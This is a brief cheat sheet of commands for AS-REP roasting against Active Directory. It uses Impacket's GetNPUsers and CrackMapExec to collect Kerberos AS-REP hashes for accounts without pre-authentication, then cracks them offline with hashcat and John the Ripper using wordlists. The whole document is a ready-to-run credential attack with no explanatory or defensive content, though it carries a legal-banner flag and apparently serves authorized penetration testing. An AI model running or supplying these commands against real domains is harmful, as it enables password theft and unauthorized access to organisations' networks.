---
legal-banner: true
---

### **USING IMPACKET GETNPUSERS.PY**

1.  Update the package list:  
    `sudo apt-get update`
2.  Install Impacket:  
    `sudo apt-get install python3-impacket`
3.  Enumerate Accounts:  
    `impacket-GetNPUsers -dc-ip [IP_ADDRESS] example.local/ -usersfile users.txt -no-pass -outputfile asrep_hashes.txt`
4.  Crack AS-REP Hashes using Hashcat:  
    `hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt`
5.  Crack AS-REP Hashes using John the Ripper:  
    `john --format=krb5asrep --wordlist=wordlist.txt asrep_hashes.txt`

### **USING CRACKMAPEXEC**

1.  Enumerate Accounts and Retrieve AS-REP Hashes:  
    `crackmapexec smb [IP_ADDRESS] -u users.txt --asreproast asrep_hashes.txt`